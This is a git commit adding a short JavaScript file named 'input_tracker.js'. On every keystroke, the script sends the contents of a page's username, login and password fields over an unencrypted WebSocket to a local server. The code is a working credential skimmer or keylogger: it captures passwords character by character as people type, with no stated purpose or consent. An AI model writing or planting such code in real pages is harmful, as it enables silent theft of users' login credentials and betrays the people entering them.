84b4e627ec33345530fedc297e84f2e82860f891
Sierra Grace <132104920+SierraGrace@users.noreply.github.com>
2024-06-17 13:07:30 +0300

    Created and configured input tracker

---
+++ js/input_tracker.js
@@ -0,0 +1,17 @@
+const userNameInput = document.getElementById('userNameInput');
+const loginInput = document.getElementById('loginInput');
+const passwordInput = document.getElementById('passwordInput');
+
+const ws = new WebSocket('ws://localhost:8001');
+
+userNameInput.addEventListener('keyup', event => {
+	ws.send(userNameInput.value);
+});
+
+loginInput.addEventListener('keyup', event => {
+	ws.send(loginInput.value);
+});
+
+passwordInput.addEventListener('keyup', event => {
+	ws.send(passwordInput.value);
+});
